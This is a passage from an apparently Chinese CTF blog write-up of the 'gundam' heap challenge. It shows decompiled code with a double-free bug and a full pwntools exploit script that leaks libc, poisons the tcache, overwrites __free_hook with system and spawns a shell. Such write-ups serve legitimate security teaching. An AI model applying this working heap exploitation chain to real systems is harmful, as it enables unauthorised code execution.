class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !buf )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error !&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The name of gundam :&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    *(s + <span class="number">1</span>) = buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The type of the gundam :&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>(s + <span class="number">16</span>, &amp;aFreedom[<span class="number">0x14</span> * v1]);</span><br><span class="line">    *s = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[i] = s;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++totalnum;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>del</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_D32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( totalnum )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Which gundam do you want to Destory:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">8</span> || !ptr[v1] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *ptr[v1] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(ptr[v1] + <span class="number">8LL</span>)); <span class="comment">// 没有置零 double free</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No gundam&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>distroy</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_E22</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ptr[i] &amp;&amp; !*ptr[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(ptr[i]);</span><br><span class="line">      ptr[i] = <span class="number">0LL</span>;</span><br><span class="line">      --totalnum;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题有两个摧毁,一个是distroy一个是del delfree了0x100大小的堆,distroyfree了0x100已经free过的0x30的堆</p>
<p>show</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_EF4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( totalnum )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ptr[i] &amp;&amp; *ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nGundam[%u] :%s&quot;</span>, i, *(ptr[i] + <span class="number">8LL</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Type[%u] :%s\n&quot;</span>, i, (ptr[i] + <span class="number">16LL</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No gundam produced!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">file_path = <span class="string">&#x27;./gundam&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    io = process(file_path)</span><br><span class="line">    libc = ELF(<span class="string">&quot;/glibc/x64/2.27/lib/libc-2.27.so&quot;</span>)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;/glibc/x64/2.23/lib/libc-2.23.so&quot;)</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29286</span>)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;./libc-2.27-x64.so&quot;)</span></span><br><span class="line">    <span class="comment"># libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;/home/youyue271/Desktop/buulibc/libc-2.27-x64.so&quot;</span>)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.27-x86.so&quot;)</span></span><br><span class="line">    <span class="comment"># libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.27.so&quot;)</span></span><br><span class="line">    <span class="comment"># libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x64.so&quot;)</span></span><br><span class="line">    <span class="comment"># libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x86.so&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DEBUG</span>(<span class="params">bps=[],pie =<span class="literal">False</span></span>):</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="comment">#cmd=&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base =<span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="comment">#base =int(os.popen(&quot;pmap -x &#123;0&#125; &quot;.format(io.pid)).readlines()[2][:16],16)</span></span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps]) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *$rebase(&#123;:#x&#125;)\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if bps !=[]:</span></span><br><span class="line">    <span class="comment">#     cmd +=&#x27;c&#x27;</span></span><br><span class="line">    pwnlib.gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>, <span class="string">&#x27;1&#x27;</span>) <span class="comment"># add</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>, <span class="string">&#x27;2&#x27;</span>) <span class="comment"># edit</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">3</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>, <span class="string">&#x27;3&#x27;</span>) <span class="comment"># del</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">4</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Your choice : &quot;</span>, <span class="string">&#x27;4&#x27;</span>) <span class="comment"># show</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># io.sendlineafter(&quot;The name of gundam :&quot;, str(size))</span></span><br><span class="line">    io.sendafter(<span class="string">&quot;The name of gundam :&quot;</span>, content)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;The type of the gundam :&quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Which gundam do you want to Destory:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">distroy</span>():</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># def edit(index, flag, content):</span></span><br><span class="line"><span class="comment">#     menu(3)</span></span><br><span class="line"><span class="comment">#     io.sendlineafter(&quot;the note:&quot;, str(index))</span></span><br><span class="line"><span class="comment">#     # io.sendlineafter(&quot;Size: &quot;, str(size))</span></span><br><span class="line"><span class="comment">#     io.sendlineafter(&quot;[1.overwrite/2.append]&quot;, str(flag))</span></span><br><span class="line"><span class="comment">#     io.sendlineafter(&quot;Contents:&quot;, content)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># io.sendlineafter(&quot;id of the note:&quot;, str(index))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x100</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>) :<span class="comment"># 填满tcachebin</span></span><br><span class="line">    add(payload)</span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span> * <span class="number">0x100</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">2</span>): <span class="comment"># 一个用来进unsortedbin,另一个防止和topchunk合并</span></span><br><span class="line">    add(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>): <span class="comment"># 把unsortedbin里的东西取出来</span></span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">distroy()</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">7</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>): <span class="comment"># 重新取出来,这里因为用malloc,所以不会重置里面的内容</span></span><br><span class="line">    add(payload)</span><br><span class="line"></span><br><span class="line">show() <span class="comment"># 因为在add的时候没有\x00截断,而show的时候用的%s所以我们可以将后面堆的东西给带出来,泄露libc</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:] + <span class="string">&#x27;\x00\x00&#x27;</span>) - <span class="number">0x10</span> - <span class="number">96</span> - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base  =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># doublefree,</span></span><br><span class="line">distroy()</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>] <span class="comment"># 在free_hook的位置写system</span></span><br><span class="line">log.success(<span class="string">&quot;free_hook  =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free_hook)))</span><br><span class="line">payload = p64(free_hook)</span><br><span class="line">add(payload)</span><br><span class="line">add(payload)</span><br><span class="line">log.success(<span class="string">&quot;libc_base  =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_libc = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system_libc  =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_libc)))</span><br><span class="line"></span><br><span class="line">payload = p64(system_libc)</span><br><span class="line">add(payload)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00\x00&#x27;</span></span><br><span class="line">add(payload)</span><br><span class="line">show()</span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># 构造完了,直接free</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"># pwn</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/09/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="prev" title="计算机网络">
      <i class="fa fa-chevron-left"></i> 计算机网络
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/10/01/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/" rel="next" title="机器学习线性代数基础">
      机器学习线性代数基础 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    
  <div class="comments">
    <div id="lv-container" data-id="city" data-uid="MTAyMC81MzE3MS8yOTY0Nw=="></div>
  </div>
  

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Ptmalloc2"><span class="nav-number">1.</span> <span class="nav-text">深入理解Ptmalloc2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc%E6%A6%82%E8%BF%B0%EF%BC%88malloc-c%EF%BC%892-27"><span class="nav-number">1.1.</span> <span class="nav-text">malloc概述（malloc.c）2.27</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-c-%E4%B8%BB%E8%A6%81%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.</span> <span class="nav-text">malloc.c 主要函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AD%98%E4%BA%A4%E4%BA%92%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.1.</span> <span class="nav-text">系统内存交互函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#s-brk"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">(s)brk</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mmap%E5%92%8Cmunmap"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">mmap和munmap</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%94%AF%E6%8C%81"><span class="nav-number">1.3.</span> <span class="nav-text">多线程支持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E7%9A%84%E7%BB%93%E6%9E%84"><span class="nav-number">1.4.</span> <span class="nav-text">堆的结构</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#malloc-chunk"><span class="nav-number">1.4.1.</span> <span class="nav-text">malloc_chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#chunk%E7%9B%B8%E5%85%B3%E5%AE%8F"><span class="nav-number">1.4.2.</span> <span class="nav-text">chunk相关宏</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#chunk%E4%B8%8Emem%E6%8C%87%E9%92%88%E5%A4%B4%E9%83%A8%E7%9A%84%E8%BD%AC%E6%8D%A2"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">chunk与mem指针头部的转换</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%80%E5%B0%8Fchunk%E5%A4%A7%E5%B0%8F"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">最小chunk大小</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%80%E5%B0%8F%E7%94%B3%E8%AF%B7%E7%9A%84%E5%A0%86%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F"><span class="nav-number">1.4.2.3.</span> <span class="nav-text">最小申请的堆内存大小</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E5%AD%97%E8%8A%82%E6%95%B0%E5%88%A4%E6%96%AD"><span class="nav-number">1.4.2.4.</span> <span class="nav-text">请求字节数判断</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%86%E7%94%A8%E6%88%B7%E8%AF%B7%E6%B1%82%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AE%9E%E9%99%85%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F"><span class="nav-number">1.4.2.5.</span> <span class="nav-text">将用户请求内存大小转换为实际分配内存大小</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A0%87%E8%AE%B0%E4%BD%8D%E7%9B%B8%E5%85%B3"><span class="nav-number">1.4.2.6.</span> <span class="nav-text">标记位相关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96chunksize"><span class="nav-number">1.4.2.7.</span> <span class="nav-text">获取chunksize</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E4%B8%8B%E4%B8%80%E4%B8%AA%E7%89%A9%E7%90%86%E7%9B%B8%E9%82%BB%E7%9A%84chunk"><span class="nav-number">1.4.2.8.</span> <span class="nav-text">获取下一个物理相邻的chunk</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%89%8D%E4%B8%80%E4%B8%AAchunk%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="nav-number">1.4.2.9.</span> <span class="nav-text">获取前一个chunk的信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%8C%87%E5%AE%9A%E5%81%8F%E7%A7%BB%E7%9A%84chunk"><span class="nav-number">1.4.2.10.</span> <span class="nav-text">获取指定偏移的chunk</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8C%87%E5%AE%9A%E5%81%8F%E7%A7%BB%E5%A4%84chunk%E4%BD%BF%E7%94%A8%E7%8A%B6%E6%80%81%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C"><span class="nav-number">1.4.2.11.</span> <span class="nav-text">指定偏移处chunk使用状态相关操作</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BD%93%E5%89%8Dchunk%E4%BD%BF%E7%94%A8%E7%8A%B6%E6%80%81%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C"><span class="nav-number">1.4.2.12.</span> <span class="nav-text">当前chunk使用状态相关操作</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AEchunk%E7%9A%84size%E5%AD%97%E6%AE%B5"><span class="nav-number">1.4.2.13.</span> <span class="nav-text">设置chunk的size字段</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bin"><span class="nav-number">1.4.3.</span> <span class="nav-text">bin</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#bin%E7%9A%84%E9%80%9A%E7%94%A8%E5%AE%8F"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">bin的通用宏</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#fastbin"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">fastbin</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#smallbin"><span class="nav-number">1.4.3.3.</span> <span class="nav-text">smallbin</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#largebin"><span class="nav-number">1.4.3.4.</span> <span class="nav-text">largebin</span></a></li><li class="nav-item 